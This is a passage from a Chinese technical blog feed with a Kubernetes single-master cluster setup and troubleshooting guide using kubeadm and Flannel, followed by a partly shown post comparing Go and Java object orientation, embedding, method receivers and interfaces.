Roles</span><br><span class="line">[bootstrap-token] configured RBAC rules to allow Node Bootstrap tokens to get nodes</span><br><span class="line">[bootstrap-token] configured RBAC rules to allow Node Bootstrap tokens to post CSRs in order for nodes to get long term certificate credentials</span><br><span class="line">[bootstrap-token] configured RBAC rules to allow the csrapprover controller automatically approve CSRs from a Node Bootstrap Token</span><br><span class="line">[bootstrap-token] configured RBAC rules to allow certificate rotation for all node client certificates in the cluster</span><br><span class="line">[bootstrap-token] Creating the &quot;cluster-info&quot; ConfigMap in the &quot;kube-public&quot; namespace</span><br><span class="line">[kubelet-finalize] Updating &quot;/etc/kubernetes/kubelet.conf&quot; to point to a rotatable kubelet client certificate and key</span><br><span class="line">[addons] Applied essential addon: CoreDNS</span><br><span class="line">[addons] Applied essential addon: kube-proxy</span><br><span class="line"></span><br><span class="line">Your Kubernetes control-plane has initialized successfully!</span><br><span class="line"></span><br><span class="line">To start using your cluster, you need to run the following as a regular user:</span><br><span class="line"></span><br><span class="line">  mkdir -p $HOME/.kube</span><br><span class="line">  sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config</span><br><span class="line">  sudo chown $(id -u):$(id -g) $HOME/.kube/config</span><br><span class="line"></span><br><span class="line">Alternatively, if you are the root user, you can run:</span><br><span class="line"></span><br><span class="line">  export KUBECONFIG=/etc/kubernetes/admin.conf</span><br><span class="line"></span><br><span class="line">You should now deploy a pod network to the cluster.</span><br><span class="line">Run &quot;kubectl apply -f [podnetwork].yaml&quot; with one of the options listed at:</span><br><span class="line">  https://kubernetes.io/docs/concepts/cluster-administration/addons/</span><br><span class="line"></span><br><span class="line">Then you can join any number of worker nodes by running the following on each as root:</span><br><span class="line"></span><br><span class="line">kubeadm join 10.10.10.101:6443 --token 42umpk.lqtmjnryhec3oj4f \</span><br><span class="line">        --discovery-token-ca-cert-hash sha256:2a05b1260021049e27aa798119b78582f02f0ce4dc80652b71fa361d69ed56d7</span><br></pre></td></tr></table></figure><p>最后一行可以看到给出了加入该集群的token，我们直接复制这个去子节点执行就行了。</p><h2 id="子节点加入">子节点加入</h2><p>直接执行上面那个命令，终端输出如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@k8s-node01 ~]# kubeadm join 10.10.10.101:6443 --token 42umpk.lqtmjnryhec3oj4f --discovery-token-ca-cert-hash sha256:2a05b1260021049e27aa798119b78582f02f0ce4dc80652b71fa361d69ed56d7</span><br><span class="line">[preflight] Running pre-flight checks</span><br><span class="line">        [WARNING IsDockerSystemdCheck]: detected &quot;cgroupfs&quot; as the Docker cgroup driver. The recommended driver is &quot;systemd&quot;. Please follow the guide at https://kubernetes.io/docs/setup/cri/</span><br><span class="line">[preflight] Reading configuration from the cluster...</span><br><span class="line">[preflight] FYI: You can look at this config file with &#x27;kubectl -n kube-system get cm kubeadm-config -o yaml&#x27;</span><br><span class="line">[kubelet-start] Writing kubelet configuration to file &quot;/var/lib/kubelet/config.yaml&quot;</span><br><span class="line">[kubelet-start] Writing kubelet environment file with flags to file &quot;/var/lib/kubelet/kubeadm-flags.env&quot;</span><br><span class="line">[kubelet-start] Starting the kubelet</span><br><span class="line">[kubelet-start] Waiting for the kubelet to perform the TLS Bootstrap...</span><br><span class="line"></span><br><span class="line">This node has joined the cluster:</span><br><span class="line">* Certificate signing request was sent to apiserver and a response was received.</span><br><span class="line">* The Kubelet was informed of the new secure connection details.</span><br><span class="line"></span><br><span class="line">Run &#x27;kubectl get nodes&#x27; on the control-plane to see this node join the cluster.</span><br></pre></td></tr></table></figure><p>两个节点都加入后的结果：</p><figure><imgsrc="/img/Kubernetes-集群环境搭建使用及问题记录（一）/image-20210804095015676.png"alt="image-20210804095015676" /><figcaption aria-hidden="true">image-20210804095015676</figcaption></figure><h2 id="安装网络插件flannel">安装网络插件（Flannel）</h2><p>你可以使用<code>kubectl apply -f https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml</code>来执行，<strong>但是如果初始化的时候你的--pod-network-cidr</strong>参数不是flannel默认的<code>10.244.0.0/16</code>的话，我建议你下载下来手动修改一下网络参数，然后<code>apply -f kube-flannel.yml</code>就可以了，结果如下：</p><figure><imgsrc="/img/Kubernetes-集群环境搭建使用及问题记录（一）/image-20210804095357877.png"alt="image-20210804095357877" /><figcaption aria-hidden="true">image-20210804095357877</figcaption></figure><figure><imgsrc="/img/Kubernetes-集群环境搭建使用及问题记录（一）/image-20210804095412669.png"alt="image-20210804095412669" /><figcaption aria-hidden="true">image-20210804095412669</figcaption></figure><h2 id="创建pod来测试集群">创建pod来测试集群</h2><p>我们先创建一个nginx的pod，命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 创建pod</span><br><span class="line">kubectl create deployment nginx --image=nginx</span><br><span class="line">// 等待pod运行起来了后，暴露其端口</span><br><span class="line">kubectl expose deployment nginx --port=80 --type=NodePort</span><br><span class="line">// 查看服务状态，结果如下图</span><br><span class="line">kubectl get pods,svc -o wide</span><br></pre></td></tr></table></figure><figure><imgsrc="/img/Kubernetes-集群环境搭建使用及问题记录（一）/image-20210804105802347.png"alt="image-20210804105802347" /><figcaption aria-hidden="true">image-20210804105802347</figcaption></figure><p>我们可以看到nginx这个pod被分到了k8s-node01节点(本机10.10.10.101，k8s-node01为10.10.10.102)上，且暴露到外部的端口为32700，我们访问即可：</p><figure><imgsrc="/img/Kubernetes-集群环境搭建使用及问题记录（一）/image-20210804105910221.png"alt="image-20210804105910221" /><figcaption aria-hidden="true">image-20210804105910221</figcaption></figure><h1 id="出现的问题">出现的问题</h1><h2id="kubeadm初始化---failed-to-pull-image-registry.aliyuncs.comgoogle_containerscorednsv1.8.0">kubeadm初始化- failed to pull imageregistry.aliyuncs.com/google_containers/coredns:v1.8.0</h2><blockquote><p>问题：即拉不到镜像</p></blockquote><p>这算是个小bug吧，我们用的是阿里云的源，阿里那边给这个镜像打的标签是<strong>1.8.0</strong>而不是<strong>v1.8.0</strong>所以拉不到，所以我们需要手动从阿里云拉取coredns(标签是:1.8.0)，然后手动把标签改成v1.8.0，再次初始化就好了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">先拉取这个需要的镜像</span></span><br><span class="line">docker pull registry.aliyuncs.com/google_containers/coredns:1.8.0</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重新打tag</span></span><br><span class="line">docker tag registry.aliyuncs.com/google_containers/coredns:1.8.0 registry.aliyuncs.com/google_containers/coredns:v1.8.0</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除原有镜像</span></span><br><span class="line">docker rmi registry.aliyuncs.com/google_containers/coredns:1.8.0</span><br></pre></td></tr></table></figure><h2id="kubectl-get-nodes报错the-connection-to-the-server-localhost8080-was-refused---did-you-specify-the-right-host-or-port">kubectlget nodes报错The connection to the server localhost:8080 was refused -did you specify the right host or port?</h2><blockquote><p>问题：不能使用Kubectl</p></blockquote><p>解决方法：首先这个命令是在主节点上执行的，不是在Node节点上运行的。其次，注意要使用这个命令必须你的家目录下有<code>.kube</code>文件夹。用当时建立<code>.kube</code>的用户来执行这个命令。我们刚初始化完主节点的时候有一个提示：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">To start using your cluster, you need to run the following as a regular user:</span><br><span class="line"></span><br><span class="line">  mkdir -p $HOME/.kube</span><br><span class="line">  sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config</span><br><span class="line">  sudo chown $(id -u):$(id -g) $HOME/.kube/config</span><br></pre></td></tr></table></figure><p>比如我用<code>float</code>用户建立的那就用这个用户执行这个命令。如果你用root的话可以执行这个命令：<code>export KUBECONFIG=/etc/kubernetes/admin.conf</code>，或者直接用root创建<code>.kube</code>就行了。</p><h2id="flannel网络插件---安装flannel网络时出现镜像不能成功拉取">Flannel网络插件- 安装Flannel网络时出现镜像不能成功拉取</h2><blockquote><p>kubectl apply -fkube-flannel.yml加载flannel模块后pod起不来的问题，可能出现ImagePullBackOff等错误</p></blockquote><p>问题如图：</p><figure><imgsrc="/img/Kubernetes-集群环境搭建使用及问题记录（一）/image-20210803194908939.png"alt="image-20210803183425153" /><figcaption aria-hidden="true">image-20210803183425153</figcaption></figure><p>这是因为默认镜像来源<code>quay.io</code>访问不到的问题，阿里云暂时也没有对kubernetes的组件做镜像，所以这里你只能去github手动下载然后<code>docker load</code>镜像，flannel地址<code>https://github.com/flannel-io/flannel#flannel</code>。导入结果如下：</p><figure><imgsrc="/img/Kubernetes-集群环境搭建使用及问题记录（一）/image-20210803195123781.png"alt="image-20210803195123781" /><figcaption aria-hidden="true">image-20210803195123781</figcaption></figure><p>然后你可以手动把镜像拉取失败的pod删掉：<code>kubectl delete pod -n kube-system xxxx</code>，然后它会自动重建pod，然后等待初始化完成。</p><h2id="flannel网络插件---error-registering-network-failed-to-acquire-lease-node-xxx-pod-cidr-not-assigned">Flannel网络插件- Error registering network: failed to acquire lease: node "xxx" podcidr not assigned</h2><blockquote><p>子节点不能获取pod CIDR地址</p></blockquote><p>问题如下图：</p><figure><imgsrc="/img/Kubernetes-集群环境搭建使用及问题记录（一）/image-20210804093745889.png"alt="image-20210804093745889" /><figcaption aria-hidden="true">image-20210804093745889</figcaption></figure><p>出现这个问题的原因是你的子节点没有收到<code>podCIDR</code>参数。要解决这个问题，主要从两方面进行排查，首先你自己要确保两方面：</p><ul><li>在<code>kubeadm --init ...</code>的时候带上了<code>--pod-network-cidr</code>这个参数，<strong>注意这个参数不能和你当前机器所在的LAN冲突</strong></li><li>其次在安装flannel网络插件的时候，配置文件要中更改网络信息中的网段，如下图。<strong>注意直接去applyraw,githubusercontent.com官方那个话，人家那个网段写的是10.244.0.0/16，所以你要么把你--pod-network-cidr改成10.244.0.0/16。要么你就把那个yml下载下来像我一样改成自己想要的。</strong></li></ul><figure><imgsrc="/img/Kubernetes-集群环境搭建使用及问题记录（一）/image-20210804094134460.png"alt="image-20210804094134460" /><figcaption aria-hidden="true">image-20210804094134460</figcaption></figure><p>但是实际上，我上面两步都做了，但是依旧出现了这个问题，如果你也一样，那你可以使用下面的命令来解决这个问题：</p><p><code>kubectl patch node k8s-node01 -p '&#123;"spec":&#123;"podCIDR":"10.10.12.0/24"&#125;&#125;'</code>，成功结果如下：</p><figure><imgsrc="/img/Kubernetes-集群环境搭建使用及问题记录（一）/image-20210804094610830.png"alt="image-20210804094610830" /><figcaption aria-hidden="true">image-20210804094610830</figcaption></figure><p>没有问题的话，你每一个节点应该都是可以看到如下信息的。<strong>但是这只是事后的解决办法，我还暂时不知道本质原因</strong></p><figure><imgsrc="/img/Kubernetes-集群环境搭建使用及问题记录（一）/image-20210804095517000.png"alt="image-20210804095517000" /><figcaption aria-hidden="true">image-20210804095517000</figcaption></figure><h1 id="参考文章">参考文章</h1><h2 id="环境搭建">环境搭建</h2><p><ahref="https://www.bilibili.com/video/BV1GT4y1A756?p=6">k8s教程由浅入深-尚硅谷_哔哩哔哩_bilibili</a></p><h2 id="问题排查">问题排查</h2><p><ahref="https://blog.csdn.net/a749227859/article/details/118732605">初始化Kubernetes 主节点 failed to pull imageregistry.aliyuncs.com/google_containers/coredns:v1.8.0_a749227859的博客-CSDN博客</a></p><p><ahref="https://stackoverflow.com/questions/61811883/flannel-is-crashing-for-slave-node">kubernetes- Flannel is crashing for Slave node - Stack Overflow</a></p><p><ahref="http://www.hyhblog.cn/2021/02/21/k8s-flannel-pod-cidr-not-assigned/">k8s集群flannel部署错误异常排查：podcidr not assigned | 滩之南 (hyhblog.cn)</a></p><p><img src="/img/请我喝杯咖啡吧.jpg" style="zoom:33%;" /></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;本篇将搭建一个单master节点的集群(后续补多master)并测试其可用性。整体上过程不是很复杂，就是中间几个报错耗点时间，所有我搭建中出现的问题也有记录&lt;/p&gt;
&lt;p&gt;本文操作系统Centos
7；kubernetes版本：v1.21.3；docker版本：20.10.7。&lt;/p&gt;
&lt;p&gt;&lt;img
src=&quot;/img/Kubernetes-集群环境搭建使用及问题记录（一）/components-of-kubernetes.png&quot; /&gt;&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="开发技术" scheme="https://lzwgiter.github.io/categories/%E5%BC%80%E5%8F%91%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="分布式技术" scheme="https://lzwgiter.github.io/tags/%E5%88%86%E5%B8%83%E5%BC%8F%E6%8A%80%E6%9C%AF/"/>
    
    <category term="Kubernete" scheme="https://lzwgiter.github.io/tags/Kubernete/"/>
    
  </entry>
  
  <entry>
    <title>闲聊一下Go语言的函数方法和多态机制特点</title>
    <link href="https://lzwgiter.github.io/posts/2f0b60dd.html"/>
    <id>https://lzwgiter.github.io/posts/2f0b60dd.html</id>
    <published>2021-07-24T06:26:39.000Z</published>
    <updated>2023-04-19T13:44:22.438Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>想闲聊一下Go语言和Java在函数方法、继承、接口、多态机制等方面的区别，这个两个在面向对象思想方面的设计是有不小区别的，具体在编程上也会有较大的区别。这篇我以Java和Go语言代码作为对比，在几个重要问题上记录下区别，帮助自己适应一下Go语言的特点。</p><p><img src="/img/闲聊一下Go语言的函数方法和多态机制特点/1.jpeg" /></p></blockquote><span id="more"></span><h2 id="go语言----对象封装">Go语言 -- 对象封装</h2><h3 id="更加简洁的经典struct">更加简洁的经典struct</h3><p>如果我们是在Java里面，我们怎么定义一个对象呢？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="type">Integer</span> <span class="variable">id</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> Integer age;</span><br><span class="line">    <span class="keyword">private</span> String email;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面这段代码我们看Person这个对象有哪些特点呢？</p><ul><li>有四个很清晰的属性：id、name、age、email。</li><li>四个属性的类型很清晰。</li><li>四个属性的关键字<code>protected</code>、<code>public</code>、<code>private</code>很清晰的说明了这四个属性的范围。</li></ul><p>要我来说总结的话：<strong>清晰明了、非常规矩规范。</strong>当然如果是一个Bean的话，那么他就都是private的了，只能通过getter、setter来进行访问。</p><p>但是呢？Goer们说了，“Java废话好多啊"，"代码好长啊”。那同样例子换Go呢？</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</span><br><span class="line">    id    <span class="type">int</span></span><br><span class="line">    Name  <span class="type">string</span></span><br><span class="line">    Age   <span class="type">int</span></span><br><span class="line">    email <span class="type">string</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到使用了类似C语言的<code>struct</code>关键字，也是清晰明了，有以下的特点：</p><ul><li><p>使用<code>struct</code>结构体来描述对象</p></li><li><p>先写变量名再写类型，且无范围修饰符</p></li><li><p>变量名首字母大小不同</p></li></ul><p>那我说其实看的时候就要细心一点了，Go没有private等这些关键字所以就靠变量名大小写了，比如id属性，它就是个私有属性，你是不能从其他包访问到的。而大写的变量名则可以正常访问。</p><h3 id="怎么继承">怎么继承？</h3><p>我们知道<code>Java</code>是使用<code>extends</code>关键字来实现继承的，我们紧接上面的例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Superman</span> <span class="keyword">extends</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String skill;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样Superman这个类就继承了Person类，这代表了：</p><ul><li>继承了Person类中的Public属性</li><li>继承了Person类中的Public方法</li><li>父类是Person</li></ul><p>这是一个单一集成的关系，一个类有且只能有一个父类，当然Java有也有抽象类，更重要的是有<code>接口 interface</code>的概念，所以具有良好的多态性，也便于维护。同样的例子我们看看Go语言是怎么继承的：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Superman <span class="keyword">struct</span> &#123;</span><br><span class="line">    Person</span><br><span class="line">    skill <span class="type">string</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>好了，这就完了。就直接在struct里写上要继承的类就完事了，emmmm确实很简单，当然看不到的东西我们要讨论一下，写一个类名代表了什么？</p><ul><li>父类所有变量都提升为了子类的变量(<strong>注意包括私有变量</strong>)</li><li>父类所有的接口实现也提升为了子类的接口实现</li></ul><p>可能你猛的一下就蒙了，这算啥子继承？这不就是复制粘贴么。这也是Go语言多态设计的特点，我最后两章会讨论这个问题。</p><p>其实在Go语言可能更喜欢把这个叫<code>嵌入类型（type embedding）</code>而不是继承，有内、外之分。像这个Superman和Person的关系，Person就是Superman的内部类型。其特点如下（《Goin Action》）：</p><blockquote><p>通过嵌入类型，与内部类型相关的标识符会提升到外部类型上，这些被提升的标识符就行直接声明在外部类型的标识符一样，也是外部类型的一部分。这样外部类型就组合了内部类型包含的所有属性，并且可以添加新的字段和方法。外部类型也可以通过声明与内部类型标识符同名的标识符来覆盖内部标识符的字段或者方法。</p></blockquote><p>如果你是Java来的，我这么说你就更清晰了：Go里对内部类型变量、字段的覆写相当于-&gt;Java里对父类方法的覆写，叫@Override。所以你感觉上是直接把父类粘贴进去了，实际上还是有点区别的。</p><h3 id="怎么定义对象方法">怎么定义对象方法？</h3><p>一个比较大的区别就是定义方法了。Java里面我们有很清晰的Class概念，单个Java对象你什么方法你就都定义在你的Class里，定义好你的方法的范围、参数、返回值即可，好比我们的Person：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="type">Integer</span> <span class="variable">id</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> Integer age;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String email;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(Integer id, String email)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">        <span class="built_in">this</span>.email = email;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">say</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello, My name is &quot;</span> + <span class="built_in">this</span>.name</span><br><span class="line">                + <span class="string">&quot; and My email address is &quot;</span> + <span class="built_in">this</span>.email);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>你用就完了，当然方法也有静态方法，但是他们都在Person这个Class范围里面，没有多余的标识符，特点：</p><ul><li>都在Class范围内</li><li>无需是哪个类的方法，因为就定义在Class里就是他的</li></ul><p>那我们的Go呢？则刚好反过来了，上面同样的逻辑我们用go来写：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> pkg1</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</span><br><span class="line">    id    <span class="type">int</span></span><br><span class="line">    Name  <span class="type">string</span></span><br><span class="line">    Age   <span class="type">int</span></span><br><span class="line">    email <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *Person)</span></span> say()  &#123;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;Hello! My name is %s and my email address is %s&quot;</span>, p.Name, p.email)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，简洁了许多，这里我告诉你say()是Person的一个私有方法，就因为前面有一个<strong>接收者</strong>。特点：</p><ul><li>方法名前有接收者</li><li>对象定义和方法定义完全分开</li><li>方法依旧使用大小写来控制访问(包外不能访问这个方法)</li></ul><p>其作用，类型我们接下来进行讨论。</p><h2 id="go语言----函数定义">Go语言 -- 函数定义</h2><h3 id="接收者">接收者？</h3><p>okk，什么是接收者？即<code>receiver</code>，他代表了这个方法是谁的。其有两种类型：</p><ul><li>值类型</li><li>指针类型</li></ul><p>上面Student的Go例子中我们就使用了指针类型的接收者，如果是值类型则这么写：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p Person)</span></span> say()  &#123;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;Hello! My name is %s and my email address is %s&quot;</span>, p.Name, p.email)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看似且运行起来没什么区别，实际上这是完全不同的两个概念。<code>*</code>在Go语言中雨C语言是一样的，是指针的概念，所以接下来我们讨论如何确定接收者什么时候用指针，包括函数参数什么使用用指针。</p><h3id="怎么确定接收者函数参数用不用指针">怎么确定接收者、函数参数用不用指针？</h3><p>我这里按照《Go InAction》来说说我的看法，实际工程中暂时经验不足，估计另有做法。</p><p>《Go InAction》中指出，在确定类型时，应先确定它是原始类型还是非原始类型。这里有一个想法上的小坑，书中也明确的指正了我：</p><p><strong>原始类型是指对这些变量进行增加或删除的时候会创建一个新值，你可以理解为原子性的；而非原始类型则在原基础上进行修改的。</strong>所以在类型的确定上，我们需要看这个对象它在这方面原始类型还是非原始类型，先说结论：</p><p>书中将Go语言类型分为了三大类：</p><ul><li>内置类型：数值类型、字符串类型和布尔类型</li><li>引用类型：切片、映射、通道、接口</li><li>结构类型：结构体</li></ul><p>其中：</p><ul><li>内置类型和引用类型的方法均为原始类型</li><li>结构体类型大部分情况下为非原始类型</li></ul><p>内置类型的例子我们看strings包的Trim函数：</p><figure><imgsrc="/img/闲聊一下Go语言的函数方法和多态机制特点/image-20210804192353201.png"alt="image-20210804192353201" /><figcaption aria-hidden="true">image-20210804192353201</figcaption></figure><p>可以看到传入的都是参数都是原数据的副本---因为他没使用指针。</p><p>引用类型我们看net包的MarshalText函数，其中IP类型定义如下：</p><p><img src="/img/闲聊一下Go语言的函数方法和多态机制特点/image-20210804192736267.png" alt="image-20210804192736267" style="zoom:80%;" /></p><p><img src="/img/闲聊一下Go语言的函数方法和多态机制特点/image-20210804192710277.png" alt="image-20210804192710277" style="zoom:80%;" /></p><p>可以看到它是一个引用类型，本质是字节切片。而MarshalText方法的接受者就是值类型，这是因为他通过<strong>复制(ip.toString())</strong>，或者叫新建，来传递了这个变量，只需要这个变量的副本就足够了，不去修改原数据,所以是原始类型，所以不用指针接收者。注意<strong>并非是因为不修改所以不用指针接收者，而是因为是原始类型所以不用。</strong>你好比net.UnMarshalText方法，他要对一个ip去进行赋值，这并不是复制、新建的操作，而是<strong>修改</strong>，即非原始类型，这时用指针接收者：</p><p><img src="/img/闲聊一下Go语言的函数方法和多态机制特点/image-20210804193647280.png" alt="image-20210804193647280" style="zoom:80%;" /></p><p>对于结构体，大部分情况下都涉及到修改，所以基本上都是使用指针来充当接收者和返回值，当然，也用值当返回值的，比如书中举了结构体Time对象Now()函数的例子：</p><p><img src="/img/闲聊一下Go语言的函数方法和多态机制特点/image-20210804191607293.png" alt="image-20210804191607293" style="zoom:80%;" /></p><p>可以看到这个函数用来新建一个时间对象，返回的是<strong>值类型</strong>Time而非<strong>指针类型</strong>*Time，原因是什么？是因为时间是不允许被修改的，一个时间节点他创建了是多少就是多少，无需也无法修改，所以是原始类型，故返回值为值类型。</p><h2 id="go语言----非侵入式的接口理念与多态">Go语言 --非侵入式的接口理念与多态</h2><p>下面讨论完了面向对象的一部分问题后，我们来看看多态这方面的问题，其中Go语言比较独特的就是这个非侵入式的接口设计。</p><h3 id="什么叫非侵入式">什么叫非侵入式？</h3><p>假如说有一个接口，他定义了一个手机应该支持的方法，我们用Java语言来描述：</p><p>首先我们去定义这个接口的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">MobileInterface</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">powerOn</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">powerOff</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">display</span><span class="params">(String text)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们现在有华为和小米手机，我们都要实现这个接口标准：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Huawei Phone</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HuaweiPhone</span> <span class="keyword">implements</span> <span class="title class_">MobileInterface</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">powerOn</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Huawei Up!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">powerOff</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Huawei Down!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">display</span><span class="params">(String text)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;This is a message&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Xiao Mi Phone</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XiaoMiPhone</span> <span class="keyword">implements</span> <span class="title class_">MobileInterface</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">powerOn</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;XiaoMi Up!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span 